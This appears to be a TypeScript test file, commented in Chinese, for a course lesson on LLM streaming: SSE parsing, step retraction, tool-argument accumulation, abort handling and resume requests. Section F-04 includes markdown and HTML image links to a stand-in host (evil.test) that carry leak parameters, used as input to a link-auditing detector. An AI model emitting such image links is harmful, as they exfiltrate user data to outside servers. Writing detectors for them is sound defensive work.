/**
 * 验证 l16/wire.ts。跑法：pnpm verify:l16
 * 先跑 WIRE_IMPL=shared pnpm verify:l16 确认测试本身是对的。
 *
 * ★ 一次模型都不调。这一节比别的更该如此——它要测的东西**全部**是
 * 协议和状态机，而且有好几个分支在真实调用里几乎撞不到：
 *
 *   服务端中途换模型（零 delta 的空块）      罕见，你没法让它发生
 *   max_tokens 恰好切在参数中间              要反复试，每次切的位置还不同
 *   CDN 把 SSE 帧重新分块                    本地根本没有 CDN
 *   流跑到一半失败并重试                     要制造上游故障
 *
 * 换句话说：**真去调模型的话，这里最重要的那几条断言一条都跑不到。**
 * 这和 L15 「实测延迟不可复现」是同一个理由的另一面。
 *
 * 断言编号照搬调研报告第十节的六组清单，一共 68 条：
 *   A 分帧（22）· B 撤回（12）· C 参数累积（11）
 *   D 并行归位（8）· E 中断语义（8）· F 渲染层（7）
 *
 * 带 ★ 的每一条对应一种"看起来对了但没有"：
 * 把「空行」当成 \n\n、把 append 当成渲染、把截断当成非法、
 * 把零 delta 当成工具调用、把卸载当成取消、把过滤当成清理。
 */

import { readFileSync } from 'node:fs'
import * as shared from '../shared/wire.ts'
import type { Chunk, RawToolEvent, View } from '../shared/wire.ts'

const TARGET = process.env.WIRE_IMPL === 'shared' ? 'shared' : 'mine'

/**
 * ★ l16/wire.ts 里的 TODO 用的是 My* 前缀（避免和 shared 的同名导入冲突），
 * 所以这里要把名字映射回去。
 */
const mine = (await import('./wire.ts')) as unknown as Record<string, unknown>
const M = TARGET === 'shared'
  ? shared
  : ({
      SseParser: mine.MySseParser,
      findFrameEnd: mine.myFindFrameEnd,
      applyChunk: mine.myApplyChunk,
      JsonAccumulator: mine.MyJsonAccumulator,
      reassemble: mine.myReassemble,
      checkResumable: mine.myCheckResumable,
      auditLinks: mine.myAuditLinks,
      // 下面这些没有 TODO 版本，一律用参考实现
      Relay: shared.Relay,
      Utf8Stream: shared.Utf8Stream,
      relayFrames: shared.relayFrames,
      chopRelay: shared.chopRelay,
      emptyView: shared.emptyView,
      visibleText: shared.visibleText,
      invalidJsonPayload: shared.invalidJsonPayload,
      sanitizeInline: shared.sanitizeInline,
      StopPolicy: shared.StopPolicy,
      abortCause: shared.abortCause,
      buildResumeRequest: shared.buildResumeRequest,
    } as unknown as typeof shared)

console.log(TARGET === 'shared' ? '\n（测的是 shared/ 里的参考实现）' : '\n（测的是 l16/ 里你的实现）')

const dim = (s: string) => `\x1b[2m${s}\x1b[0m`
const bold = (s: string) => `\x1b[1m${s}\x1b[0m`
const red = (s: string) => `\x1b[31m${s}\x1b[0m`
const green = (s: string) => `\x1b[32m${s}\x1b[0m`

let passed = 0
const failures: string[] = []

function show(v: unknown): string {
  if (typeof v === 'string') return JSON.stringify(v)
  return JSON.stringify(v) ?? String(v)
}

function eq(a: unknown, b: unknown, msg = '') {
  if (JSON.stringify(a) === JSON.stringify(b)) {
    passed++
  } else {
    failures.push(`${msg}\n      期望 ${show(b)}\n      实际 ${show(a)}`)
    console.log(`  ${red('✕')} ${msg}`)
    console.log(dim(`      期望 ${show(b)}`))
    console.log(dim(`      实际 ${show(a)}`))
  }
}

function ok(c: boolean, msg = '') {
  if (c) passed++
  else {
    failures.push(msg)
    console.log(`  ${red('✕')} ${msg}`)
  }
}

function throws(fn: () => unknown, msg = '') {
  try {
    fn()
    failures.push(`${msg}（应该抛异常但没有）`)
    console.log(`  ${red('✕')} ${msg}（应该抛异常但没有）`)
  } catch {
    passed++
  }
}

function noThrow(fn: () => unknown, msg = '') {
  try {
    fn()
    passed++
  } catch (e) {
    failures.push(`${msg}（抛了：${(e as Error).message}）`)
    console.log(`  ${red('✕')} ${msg}（抛了：${(e as Error).message}）`)
  }
}

function section(s: string) {
  console.log(bold(`\n${s}`))
}

// ── 小工具：把一串输入喂给解析器 ─────────────────────────────

function parse(...chunks: string[]): shared.SseEvent[] {
  const p = new M.SseParser()
  const out: shared.SseEvent[] = []
  for (const c of chunks) out.push(...p.feed(c))
  p.end()
  return out
}

/** 把一个字符串在每个字节位置切成两块，逐一验证结果不变。 */
function everyCut(src: string, label: string) {
  const want = parse(src)
  for (let i = 1; i < src.length; i++) {
    const got = parse(src.slice(0, i), src.slice(i))
    if (JSON.stringify(got) !== JSON.stringify(want)) {
      ok(false, `${label}：在第 ${i} 字节切开后结果变了`)
      return
    }
  }
  passed++
}

// ═════════════════════════════════════════════════════════════
section('A · 分帧（22 条）')
// ═════════════════════════════════════════════════════════════

// A-01 规范示例
eq(parse('data: a\n\n'), [{ type: 'message', data: 'a', lastEventId: '' }], 'A-01 最简事件')

// A-02 / A-03 三种行结束符
eq(parse('data: a\r\n\r\n'), [{ type: 'message', data: 'a', lastEventId: '' }], 'A-02 CRLF')
eq(parse('data: a\r\r'), [{ type: 'message', data: 'a', lastEventId: '' }], 'A-03 纯 CR')

// A-04 ★ 同一条流里混用
eq(
  parse('data: a\r\ndata: b\n\n'),
  [{ type: 'message', data: 'a\nb', lastEventId: '' }],
  'A-04 ★ 混用行结束符',
)

// A-05 ★ 末尾不完整的事件直接丢弃
eq(parse('data: a\n'), [], 'A-05 ★ 无空行结尾的事件不派发')

// A-06 / A-07 冒号后只忽略一个空格
eq(parse('data:a\n\n')[0]?.data, 'a', 'A-06 无空格')
eq(parse('data:  a\n\n')[0]?.data, ' a', 'A-07 ★ 两个空格只吃掉一个')

// A-08 多 data 行用 \n 连接、去掉末尾那个
eq(parse('data: a\ndata: b\ndata: c\n\n')[0]?.data, 'a\nb\nc', 'A-08 多 data 行')

// A-09 没有冒号的整行是字段名，值为空串
eq(parse('data\n\n'), [{ type: 'message', data: '', lastEventId: '' }], 'A-09 无冒号行')

// A-10 注释被忽略，而且是**安静地**忽略
eq(parse(': comment\ndata: a\n\n').length, 1, 'A-10 注释行忽略')
eq(parse(':\n:\n:\n').length, 0, 'A-10b ★ 纯保活心跳不产生任何事件')

// A-11 event 字段
eq(parse('event: foo\ndata: a\n\n')[0]?.type, 'foo', 'A-11 event 字段')
eq(parse('data: a\n\n')[0]?.type, 'message', 'A-11b ★ 默认类型是 "message" 不是空串')

// A-12 ★ 空的 id: 是重置，不是忽略
eq(
  parse('id: 1\ndata: a\n\nid:\ndata: b\n\n').map((e) => e.lastEventId),
  ['1', ''],
  'A-12 ★ 空 id 重置 last event ID',
)

// A-13 last event ID 有粘性
eq(
  parse('id: 1\ndata: a\n\ndata: b\n\n').map((e) => e.lastEventId),
  ['1', '1'],
  'A-13 last event ID 粘性',
)

// A-14 含 NULL 的 id 整个字段忽略
eq(parse('id: a\u0000b\ndata: x\n\n')[0]?.lastEventId, '', 'A-14 id 含 NULL 则忽略')

// A-15 / A-16 / A-17 retry 只接受纯 ASCII 数字
{
  const p1 = new M.SseParser()
  p1.feed('retry: 3000\ndata: a\n\n')
  eq(p1.reconnectionTimeMs, 3000, 'A-15 retry 合法')

  const p2 = new M.SseParser()
  p2.feed('retry: 3000ms\ndata: a\n\n')
  eq(p2.reconnectionTimeMs, null, 'A-16 ★ retry: 3000ms 静默失效，不报错')

  const p3 = new M.SseParser()
  p3.feed('retry: -1\n\nretry: 3.5\n\n')
  eq(p3.reconnectionTimeMs, null, 'A-17 ★ 负数和小数都不是 ASCII 数字')

  // ★ 一个容易漏的：JS 的 \d 在 unicode 模式下会匹配别的数字字符
  const p4 = new M.SseParser()
  p4.feed('retry: ٣٠٠٠\ndata: a\n\n') // 阿拉伯-印度数字
  eq(p4.reconnectionTimeMs, null, 'A-17b ★ 非 ASCII 数字也不算')
}

// A-18 未知字段忽略。这是前向兼容机制。
eq(parse('foo: bar\ndata: a\n\n').length, 1, 'A-18 未知字段忽略')

// A-19 ★★ 这一组里最有教学价值的一条：切割点无关性
section(dim('  A-19 ★★ 穷举所有切割点（这一条能抓住 A-01..A-18 的所有漏洞）'))
for (const [label, src] of [
  ['基本', 'data: a\n\n'],
  ['CRLF', 'data: a\r\n\r\n'],
  ['混用', 'data: a\r\ndata: b\n\n'],
  ['带 id/retry', 'id: 7\nretry: 100\nevent: x\ndata: a\ndata: b\n\n'],
  ['注释+多事件', ': hi\ndata: 1\n\n: hi\ndata: 2\n\n'],
  ['CR 结尾', 'data: a\rdata: b\r\r'],
] as const) {
  everyCut(src, `A-19 ${label}`)
}

// A-20 空 data 不抛异常（Anthropic SDK 真实修过的 bug）
noThrow(() => parse('event: ping\ndata:\n\n'), 'A-20 ★ 空 data 不抛异常')
eq(parse('event: ping\ndata:\n\n')[0]?.data, '', 'A-20b 空 data 的值是空串')

// A-21 UTF-8 多字节被切在中间
{
  const text = '中文测试emoji🎉结束'
  const bytes = new TextEncoder().encode(text)
  let worst = ''
  for (let cut = 1; cut < bytes.length; cut++) {
    const s = new M.Utf8Stream()
    const got = s.push(bytes.slice(0, cut)) + s.push(bytes.slice(cut)) + s.end()
    if (got !== text) worst = `第 ${cut} 字节切开后得到 ${show(got)}`
  }
  ok(worst === '', `A-21 ★ UTF-8 多字节跨块重组（${worst}）`)
  // ★ 对照：不做增量解码会怎样
  const naive = (() => {
    const d = new TextDecoder()
    return d.decode(bytes.slice(0, 2)) + d.decode(bytes.slice(2))
  })()
  ok(naive !== text, 'A-21b ★ 对照组：每块各自 decode 会产生替换字符')
}

// A-22 无二次方复杂度
{
  const N = 20000
  const src = Array.from({ length: N }, (_, i) => `data: ${i}\n\n`).join('')
  const t0 = performance.now()
  const got = parse(src)
  const ms = performance.now() - t0
  eq(got.length, N, 'A-22 两万个事件全部解析出来')
  // ★ 二次方实现在这个规模上要几十秒。给一个宽松的上限，只抓数量级。
  ok(ms < 3000, `A-22b ★ 无二次方复杂度（实际 ${ms.toFixed(0)}ms，上限 3000ms）`)
}

// ── 帧边界（八种空行）────────────────────────────────────────
section(dim('  帧边界：八种「空行」字节组合'))
for (const [name, sep] of [
  ['CRLF+CRLF', '\r\n\r\n'],
  ['CRLF+LF', '\r\n\n'],
  ['CRLF+CR', '\r\n\r'],
  ['LF+CRLF', '\n\r\n'],
  ['LF+LF', '\n\n'],
  ['LF+CR', '\n\r'],
  ['CR+CRLF', '\r\r\n'],
  ['CR+CR', '\r\r'],
] as const) {
  const src = `data: a${sep}data: b${sep}`
  const end = M.findFrameEnd(src)
  eq(end, `data: a${sep}`.length, `findFrameEnd ${name}`)
}
// ★ CR 后面跟 LF 不算两个结束符，它就是一个 CRLF
eq(M.findFrameEnd('data: a\r\ndata: b\r\n'), null, '★ \\r\\n 是一个结束符不是两个')
eq(M.findFrameEnd('data: a\n'), null, '不完整的帧返回 null')

// ★ 转发 + naive 下游：块边界和帧边界无关
{
  const raw = 'data: {"a":1}\n\ndata: {"b":2}\n\ndata: {"c":3}\n\n'
  const chunks: string[] = []
  for (let i = 0; i < raw.length; i += 7) chunks.push(raw.slice(i, i + 7))

  const byFrame = M.chopRelay(chunks, true)
  const raw2 = M.chopRelay(chunks, false)
  ok(byFrame.naiveOk, '★ 按帧转发：naive 下游能活')
  ok(!raw2.naiveOk, '★ 原样转发：naive 下游解析不全或崩掉')
  ok(raw2.naiveCrashes > 0, `★ 原样转发确实让下游崩了 ${raw2.naiveCrashes} 次`)
  ok(byFrame.bytewise, '★ 按帧转发不改字节，只改切点')
}

// ═════════════════════════════════════════════════════════════
section('B · 撤回与状态机（12 条）')
// ═════════════════════════════════════════════════════════════

const apply = (...cs: (Chunk | { type: string })[]): View =>
  cs.reduce<View>((v, c) => M.applyChunk(v, c as Chunk), M.emptyView())

// B-01 基本累积
{
  const v = apply(
    { type: 'start-step' },
    { type: 'text-delta', id: 'a', delta: 'a' },
    { type: 'text-delta', id: 'a', delta: 'b' },
    { type: 'finish-step' },
  )
  eq(v.parts.length, 1, 'B-01 同一个 id 合成一个 part')
  eq(M.visibleText(v), 'ab', 'B-01b 内容是 "ab"')
}

// B-02 reset-step 清掉当前 step
eq(
  apply({ type: 'start-step' }, { type: 'text-delta', id: 'a', delta: 'a' }, { type: 'reset-step' })
    .parts.length,
  0,
  'B-02 reset-step 清空当前 step',
)

// B-03 ★ 不能连更早的 step 一起删
{
  const v = apply(
    { type: 'start-step' },
    { type: 'text-delta', id: 'a', delta: 'a' },
    { type: 'finish-step' },
    { type: 'start-step' },
    { type: 'text-delta', id: 'b', delta: 'b' },
    { type: 'reset-step' },
  )
  eq(M.visibleText(v), 'a', 'B-03 ★ 只删当前 step，保留已成功的第一步')
}

// B-04 ★★ 没有 step 边界时清掉整条消息
eq(
  apply({ type: 'text-delta', id: 'a', delta: 'a' }, { type: 'reset-step' }).parts.length,
  0,
  'B-04 ★★ 无 step 边界时 reset 清空全部（最容易写漏的一条）',
)

// B-05 工具槽位也要被移除
eq(
  apply(
    { type: 'start-step' },
    { type: 'tool-input-start', id: 'x', toolName: 'read' },
    { type: 'tool-input-delta', id: 'x', delta: '{' },
    { type: 'reset-step' },
  ).parts.length,
  0,
  'B-05 reset 也移除工具槽位',
)

// B-06 撤回后还能继续写
{
  const v = apply(
    { type: 'start-step' },
    { type: 'text-delta', id: 'a', delta: 'a' },
    { type: 'reset-step' },
    { type: 'text-delta', id: 'b', delta: 'b' },
    { type: 'finish-step' },
  )
  eq(M.visibleText(v), 'b', 'B-06 撤回后可继续写入')
  eq(v.retracted, 1, 'B-06b 撤回计数为 1')
}

// B-07 abort 保留已渲染内容
{
  const v = apply(
    { type: 'start-step' },
    { type: 'text-delta', id: 'a', delta: 'a' },
    { type: 'abort', reason: '用户点了停止' },
  )
  eq(M.visibleText(v), 'a', 'B-07 abort 保留已渲染的部分')
  eq(v.status, 'aborted', 'B-07b 状态是 aborted')
}

// B-08 ★★ abort 是终态
{
  const v = apply(
    { type: 'text-delta', id: 'a', delta: 'a' },
    { type: 'abort', reason: 'stop' },
    { type: 'text-delta', id: 'a', delta: 'b' },
  )
  eq(
    M.visibleText(v),
    'a',
    'B-08 ★★ abort 之后到达的 delta 被丢弃（否则会在用户按下停止后还往屏幕上写字）',
  )
}
// error 同理
eq(
  M.visibleText(
    apply({ type: 'error', message: 'boom' }, { type: 'text-delta', id: 'a', delta: 'x' }),
  ),
  '',
  'B-08b error 也是终态',
)

// B-09 幂等
noThrow(
  () => apply({ type: 'start-step' }, { type: 'reset-step' }, { type: 'reset-step' }),
  'B-09 连续两次 reset-step 幂等',
)

// B-10 ★★ 未知类型不抛错
noThrow(() => apply({ type: 'future-thing' }), 'B-10 ★★ 未知 chunk 类型不抛异常')
eq(
  M.visibleText(
    apply(
      { type: 'text-delta', id: 'a', delta: 'a' },
      { type: 'future-thing' },
      { type: 'text-delta', id: 'a', delta: 'b' },
    ),
  ),
  'ab',
  'B-10b ★ 未知类型不打断后续处理',
)

// B-11 带未知额外字段（OpenAI 的 obfuscation 真事）
eq(
  M.visibleText(
    apply({ type: 'text-delta', id: 'a', delta: 'a', obfuscation: 'xY7q' } as unknown as Chunk),
  ),
  'a',
  'B-11 ★ 带未知额外字段正常处理（OpenAI 加 obfuscation 挂过一批客户端）',
)

// B-12 新 id 建新 part
eq(
  apply(
    { type: 'text-delta', id: 'a', delta: 'a' },
    { type: 'text-delta', id: 'b', delta: 'b' },
  ).parts.length,
  2,
  'B-12 未见过的 id 创建新 part',
)

// ★ finish-step 不结束整条消息
eq(
  apply({ type: 'start-step' }, { type: 'finish-step' }).status,
  'streaming',
  '★ finish-step 结束的是一个 step，不改 status',
)

// ═════════════════════════════════════════════════════════════
section('C · 流式参数累积（11 条）')
// ═════════════════════════════════════════════════════════════

// C-01 / C-02 / C-03 三步契约 + 展示与执行的边界
{
  const a = new M.JsonAccumulator()
  a.push('{"a":')
  const mid = a.get()
  eq(mid.state, 'streaming', 'C-02 未到 stop 时状态是 streaming')
  eq(mid.canExecute, false, 'C-02b ★★ 未到 stop 不可执行')
  eq(mid.snapshot, '{"a":', 'C-08 ★ snapshot 可以展示（官方 SDK 就这么给）')
  a.push('1}')
  a.close()
  const fin = a.get()
  eq(fin.value, { a: 1 }, 'C-01 三步累积得到对象')
  eq(fin.state, 'ready', 'C-03 stop 之后状态是 ready')
  eq(fin.canExecute, true, 'C-03b stop 之后可执行')
}

// C-04 / C-05 收完也可能非法
{
  const a = new M.JsonAccumulator()
  a.push('{"a":')
  noThrow(() => a.close(), 'C-04 ★ 收完但非法：不抛异常')
  const r = a.get()
  eq(r.state, 'invalid', 'C-04b 状态是 invalid')
  eq(r.canExecute, false, 'C-04c 不可执行')

  // ★★ C-05：用 JSON 库构造包装，不要拼字符串
  const payload = M.invalidJsonPayload('{"a":"he said \\"hi\\""')
  noThrow(() => JSON.parse(payload), 'C-05 ★★ INVALID_JSON 包装本身必须是合法 JSON')
  eq(
    JSON.parse(payload).INVALID_JSON,
    '{"a":"he said \\"hi\\""',
    'C-05b 原始字符串逐字节保留（含引号）',
  )
}

// C-06 ★★ max_tokens 截断
{
  const a = new M.JsonAccumulator()
  a.push('{"path":"src/a.ts","replace":"PORT=80')
  a.truncate()
  const r = a.get()
  eq(r.state, 'truncated', 'C-06 ★★ 被 max_tokens 切断的状态是 truncated 而不是 invalid')
  eq(r.canExecute, false, 'C-06b 不可执行')

  // 而且它要触发撤回
  const v = apply(
    { type: 'start-step' },
    { type: 'text-delta', id: 't', delta: '我来改端口。' },
    { type: 'tool-input-start', id: 'x', toolName: 'edit' },
    { type: 'tool-input-delta', id: 'x', delta: '{"path":' },
    { type: 'stop-reason', reason: 'max_tokens' },
  )
  eq(v.retracted, 1, 'C-06c ★★ max_tokens 触发撤回（这条路上没有任何错误信号）')
  eq(M.visibleText(v), '我来改端口。', 'C-06d 已完成的正文保留')
  eq(v.status, 'done', 'C-06e 流是正常结束的——HTTP 200，没有 error 事件')
}

// C-07 start 里的 input 是占位符，不是初始值
{
  const a = new M.JsonAccumulator()
  const r = a.get()
  eq(r.snapshot, '', 'C-07 ★ 初始 snapshot 是空串，不是 "{}"')
  eq(r.canExecute, false, 'C-07b 什么都没收到时不可执行')
}

// C-09 ★ delta 在任意点被切碎，结果不变
{
  const full = '{"path":"src/config.ts","line":42,"text":"中文和 emoji 🎉"}'
  const want = JSON.parse(full)
  let bad = ''
  for (let cut = 1; cut < full.length; cut++) {
    const a = new M.JsonAccumulator()
    a.push(full.slice(0, cut))
    a.push(full.slice(cut))
    a.close()
    if (JSON.stringify(a.get().value) !== JSON.stringify(want)) bad = `切在第 ${cut} 处`
  }
  ok(bad === '', `C-09 ★ 分帧无关性（${bad}）`)
}

// C-10 ★★ 零 delta 是合法的
{
  const a = new M.JsonAccumulator()
  noThrow(() => a.close(), 'C-10 ★★ 零 delta 不抛异常')
  eq(a.get().value, {}, 'C-10b 零 delta 的结果是 {}（不是解析错误）')
  eq(a.get().state, 'ready', 'C-10c 零 delta 的状态是 ready')
}

// C-11 多字节字符被切断
{
  const full = '{"t":"中文测试🎉结束"}'
  const bytes = new TextEncoder().encode(full)
  const s = new M.Utf8Stream()
  const a = new M.JsonAccumulator()
  // ★ 8 这个位置是刻意选的：`{"t":"` 占 6 字节，`中` 占 3 字节（第 6–8 字节），
  // 所以在第 8 字节切开正好落在**字符中间**。切在 9 就是字符边界，等于没测到东西。
  a.push(s.push(bytes.slice(0, 8)))
  a.push(s.push(bytes.slice(8)))
  a.push(s.end())
  a.close()
  eq(a.get().value, { t: '中文测试🎉结束' }, 'C-11 ★ 多字节字符跨块重组')
}

// ═════════════════════════════════════════════════════════════
section('D · 并行工具调用的归位（8 条）')
// ═════════════════════════════════════════════════════════════

function ev(
  seq: number,
  itemId: string,
  outputIndex: number,
  phase: 'start' | 'delta' | 'stop',
  extra: { toolName?: string; delta?: string } = {},
): RawToolEvent {
  return { seq, itemId, outputIndex, phase, ...extra }
}

// D-01 ★★ 本节最重要的单条测试：完全交错
{
  const events = [
    ev(1, 'a', 0, 'start', { toolName: 'read' }),
    ev(2, 'b', 1, 'start', { toolName: 'write' }),
    ev(3, 'a', 0, 'delta', { delta: '{"path":"' }),
    ev(4, 'b', 1, 'delta', { delta: '{"path":"' }),
    ev(5, 'a', 0, 'delta', { delta: 'A.ts"}' }),
    ev(6, 'b', 1, 'delta', { delta: 'B.ts"}' }),
    ev(7, 'a', 0, 'stop'),
    ev(8, 'b', 1, 'stop'),
  ]
  const r = M.reassemble(events)
  eq(r.calls.length, 2, 'D-01 两个工具调用')
  eq(r.calls[0]?.args.value, { path: 'A.ts' }, 'D-01b ★★ 交错的参数没有串台（A）')
  eq(r.calls[1]?.args.value, { path: 'B.ts' }, 'D-01c ★★ 交错的参数没有串台（B）')
}

// D-02 三个，随机交错
{
  const names = ['read', 'write', 'grep']
  const ids = ['a', 'b', 'c']
  const parts = ids.map((id, i) => [`{"n":`, `${i}}`].map((d) => ({ id, d })))
  const events: RawToolEvent[] = []
  let seq = 1
  ids.forEach((id, i) => events.push(ev(seq++, id, i, 'start', { toolName: names[i] })))
  // 交错：先每个第一片，再每个第二片
  for (let k = 0; k < 2; k++) {
    parts.forEach((p, i) => events.push(ev(seq++, ids[i]!, i, 'delta', { delta: p[k]!.d })))
  }
  ids.forEach((id, i) => events.push(ev(seq++, id, i, 'stop')))
  const r = M.reassemble(events)
  eq(
    r.calls.map((c) => c.args.value),
    [{ n: 0 }, { n: 1 }, { n: 2 }],
    'D-02 三路交错全部正确',
  )
}

// D-03 ★ seq 乱序到达
{
  const events = [
    ev(1, 'a', 0, 'start', { toolName: 'read' }),
    ev(3, 'a', 0, 'delta', { delta: 'x"}' }),
    ev(2, 'a', 0, 'delta', { delta: '{"p":"' }),
    ev(4, 'a', 0, 'stop'),
  ]
  // 故意打乱数组顺序
  const r = M.reassemble([events[2]!, events[0]!, events[3]!, events[1]!])
  eq(r.calls[0]?.args.value, { p: 'x' }, 'D-03 ★ 按 seq 重排后正确（乱序到达是真实存在的）')
}

// D-04 ★ 单调用走同一条代码路径
{
  const r = M.reassemble([
    ev(1, 'a', 0, 'start', { toolName: 'read' }),
    ev(2, 'a', 0, 'delta', { delta: '{"p":1}' }),
    ev(3, 'a', 0, 'stop'),
  ])
  eq(r.calls.length, 1, 'D-04 ★ 单个调用（这条存在的意义是防止写出"单调用特例分支"）')
  eq(r.calls[0]?.args.value, { p: 1 }, 'D-04b 单调用参数正确')
}

// D-05 独立状态机
{
  const r = M.reassemble([
    ev(1, 'a', 0, 'start', { toolName: 'read' }),
    ev(2, 'b', 1, 'start', { toolName: 'write' }),
    ev(3, 'a', 0, 'delta', { delta: '{"p":1}' }),
    ev(4, 'a', 0, 'stop'),
    ev(5, 'b', 1, 'delta', { delta: '{"p":' }),
  ])
  eq(r.calls[0]?.args.state, 'ready', 'D-05 先 stop 的进入 ready')
  eq(r.calls[1]?.args.state, 'streaming', 'D-05b 还在流的仍是 streaming')
}

// D-06 ★★ 零 delta 是模型边界，不是工具调用
{
  const r = M.reassemble([
    ev(1, 'a', 0, 'start', { toolName: 'read' }),
    ev(2, 'a', 0, 'delta', { delta: '{"p":1}' }),
    ev(3, 'a', 0, 'stop'),
    ev(4, 'fb', 1, 'start'),
    ev(5, 'fb', 1, 'stop'),
    ev(6, 'b', 2, 'start', { toolName: 'write' }),
    ev(7, 'b', 2, 'delta', { delta: '{"p":2}' }),
    ev(8, 'b', 2, 'stop'),
  ])
  eq(r.calls.length, 2, 'D-06 ★★ 零 delta 的块不算工具调用')
  eq(r.modelBoundaries, [1], 'D-06b ★★ 它被识别为模型边界')
  eq(
    r.calls.map((c) => c.toolName),
    ['read', 'write'],
    'D-06c 两个真工具调用的名字都对',
  )
}

// D-07 排序和到达顺序无关
{
  const r = M.reassemble([
    ev(1, 'b', 5, 'start', { toolName: 'later' }),
    ev(2, 'b', 5, 'delta', { delta: '{}' }),
    ev(3, 'b', 5, 'stop'),
    ev(4, 'a', 2, 'start', { toolName: 'earlier' }),
    ev(5, 'a', 2, 'delta', { delta: '{}' }),
    ev(6, 'a', 2, 'stop'),
  ])
  eq(
    r.calls.map((c) => c.toolName),
    ['earlier', 'later'],
    'D-07 ★ 输出按 outputIndex 排序，和到达顺序无关',
  )
}

// D-08 协议违规要抛，不要静默兜住
throws(
  () =>
    M.reassemble([
      ev(1, 'a', 0, 'start', { toolName: 'read' }),
      ev(2, 'a', 0, 'start', { toolName: 'read' }),
    ]),
  'D-08 同一个 itemId 两次 start 抛错',
)
throws(
  () => M.reassemble([ev(1, 'a', 0, 'delta', { delta: '{}' })]),
  'D-08b ★ delta 找不到 start 抛错（不要静默新建）',
)

// ═════════════════════════════════════════════════════════════
section('E · 中断的语义（8 条）')
// ═════════════════════════════════════════════════════════════

// E-01 / E-02 ★★ 这两条是「断言你什么都没做」
{
  const p = new M.StopPolicy()
  p.onUnmount()
  eq(p.calls, 0, 'E-01 ★★ 组件卸载**不**调停止端点（官方：不要在路由清理里调）')
  p.onPageHide()
  eq(p.calls, 0, 'E-02 ★★ 页面 unload **不**调停止端点（那条流要保持可恢复）')
}

// E-03 / E-04 用户显式停止，且幂等
{
  const p = new M.StopPolicy()
  p.onUserStop()
  eq(p.calls, 1, 'E-03 用户点停止调用恰好一次')
  p.onUserStop()
  p.onUserStop()
  eq(p.calls, 1, 'E-04 ★ 连点三次仍然只发一次')
}

// E-05 ★ 合流之后能区分是谁触发的
{
  const user = new AbortController()
  const timeout = AbortSignal.timeout(1)
  const any = AbortSignal.any([user.signal, timeout])
  await new Promise((r) => setTimeout(r, 20))
  eq(M.abortCause(any), 'timeout', 'E-05 ★ 超时触发时能认出来（超时该重试）')

  const u2 = new AbortController()
  const any2 = AbortSignal.any([u2.signal, AbortSignal.timeout(10_000)])
  u2.abort('user pressed stop')
  eq(M.abortCause(any2), 'user', 'E-05b ★ 用户取消能认出来（这个不该重试）')
  eq(M.abortCause(new AbortController().signal), null, 'E-05c 没取消时返回 null')
}

// E-06 / E-07 / E-08 ★★ 构造下一轮请求
{
  const history: shared.HistoryBlock[] = [
    { type: 'thinking', text: '先看配置。', signature: 'sig-abc-123' },
    { type: 'redacted_thinking', text: '\u0000redacted-blob' },
    { type: 'text', text: '端口写在第 42 行。' },
  ]
  const partial = apply(
    { type: 'text-delta', id: 't', delta: '我看了一下 config.ts，' },
    { type: 'abort', reason: '用户点了停止' },
  )
  const req = M.buildResumeRequest(
    [
      { role: 'user', content: [{ type: 'text', text: '看一下端口配置' }] },
      { role: 'assistant', content: history },
    ],
    partial,
  )

  // E-06 ★★ 末尾不能是 assistant（prefill 会 400）
  eq(
    req.messages[req.messages.length - 1]?.role,
    'user',
    'E-06 ★★ 末尾是 user 消息，不是 assistant 续写（prefill 在 4.6+ 直接 400）',
  )

  // E-07 ★★ thinking 块逐字节原样，含 signature 和 redacted_thinking
  const asst = req.messages.find((m) => m.role === 'assistant')
  eq(asst?.content, history, 'E-07 ★★ 历史块逐字节原样（含 signature）')
  eq(
    asst?.content.filter((b) => b.type === 'thinking' || b.type === 'redacted_thinking').length,
    2,
    'E-07b ★★ thinking 和 redacted_thinking 都还在（400 最常见的起因就是把它们滤掉）',
  )
  ok(
    asst?.content[0]?.signature === 'sig-abc-123',
    'E-07c signature 一个字都没变（改一个字就是 400）',
  )

  // E-08 ★ 断言**没有**对历史做客户端压缩
  eq(asst?.content.length, 3, 'E-08 ★ 没有对历史做客户端压缩（那会破坏签名绑定）')

  // 半截内容确实被带上了，而且是放在 user 消息里
  ok(
    (req.messages[req.messages.length - 1]?.content[0]?.text ?? '').includes(
      '我看了一下 config.ts，',
    ),
    'E-08b 半截输出被带进了 user 消息',
  )
}

// ★ checkResumable 的判定
{
  const withTool = apply(
    { type: 'text-delta', id: 't', delta: '好的。' },
    { type: 'tool-input-start', id: 'x', toolName: 'edit' },
    { type: 'tool-input-delta', id: 'x', delta: '{"p":' },
    { type: 'abort', reason: 'stop' },
  )
  eq(M.checkResumable(withTool).ok, false, '★ 参数没收完的 tool_use 块不能部分恢复')
}

// ═════════════════════════════════════════════════════════════
section('F · 渲染层（7 条）')
// ═════════════════════════════════════════════════════════════

// F-01 / F-02 / F-03 ★ 这三条是 DOM 属性，Node 里测不了运行时。
// 所以这里对 App.tsx 的**源码**做静态断言——它能抓住回归
// （比如有人把 polite 改成 assertive），而且这是诚实的做法：
// 不假装测了运行时行为。
{
  const src = readFileSync(new URL('./ui/App.tsx', import.meta.url), 'utf8')
  ok(src.includes('aria-live="polite"'), 'F-03 ★ aria-live 是 polite（assertive 会清空朗读队列）')
  ok(!src.includes('aria-live="assertive"'), 'F-03b ★ 没有用 assertive')
  ok(src.includes('aria-busy={running}'), 'F-01/F-02 ★ aria-busy 跟着流式状态走')
  // ★ live region 必须先渲染成空的再改内容，所以那个容器不能条件渲染
  ok(
    /aria-live="polite"[\s\S]{0,80}aria-busy/.test(src),
    'F-01b live region 容器常驻（条件渲染的 live region 不会被播报）',
  )
}

// F-04 ★★ 外部图片：三种形式都要抓
{
  const md = [
    '![](https://evil.test/p?d=leak1)',
    '![载入中][ref]',
    '[ref]: https://evil.test/q?d=leak2',
    '<img src="//evil.test/r?d=leak3">',
    '![ok](https://cdn.trusted.test/logo.png)',
  ].join('\n')
  const a = M.auditLinks(md, ['cdn.trusted.test'])
  eq(a.found.length, 4, 'F-04 ★ 四个外部资源全部被发现')
  eq(a.offending.length, 3, 'F-04b ★ 三个不在白名单内')
  ok(a.offending.some((u) => u.includes('leak2')), 'F-04c ★★ 参考式 markdown 没被漏掉')
  ok(a.offending.some((u) => u === '//evil.test/r?d=leak3'), 'F-04d ★★ 协议相对 URL 算违规')
  ok(!a.offending.some((u) => u.includes('trusted')), 'F-04e 白名单内的放行')
}
// ★ 白名单而不是黑名单：解析不出来的算违规
eq(M.auditLinks('![](ht!tp://???)', []).offending.length, 1, 'F-04f ★ 解析不出来的当违规')
// ★ 站内路径和 data: 不产生外部请求
